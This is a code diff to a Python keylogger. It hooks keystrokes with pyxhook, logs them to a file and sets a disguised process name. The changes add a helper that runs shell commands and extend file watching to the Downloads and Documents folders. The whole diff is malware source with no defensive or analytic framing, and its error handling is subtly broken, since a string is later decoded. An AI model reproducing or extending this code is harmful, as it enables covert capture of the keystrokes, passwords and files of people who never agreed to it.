@@ -1,3 +1,4 @@
+import subprocess
 import setproctitle
 import psutil
 import os
@@ -47,11 +48,25 @@ def stop_keylogger():
     new_hook.cancel()
 
 
+def run_command(command):
+    try:
+        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = data.communicate()
+    except Exception:
+        out = ("psh: command not found: {}".format(command))
+    print(out.decode())
+
+
 if __name__ == '__main__':
     log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
     new_hook = pyxhook.HookManager()
     setproctitle.setproctitle(get_best_process_name())
     start_keylogger()
     stop_keylogger()
-    watch = Watch("/root/Downloads/gdfsgdf.txt")
+    watch = Watch()
+    watch.add_watched("/root/Downloads", True)
+    watch.add_watched("/root/Documents", False)
     watch.start()
+    watch.stop()
+    run_command("ls")
+    run_command("ls -a")
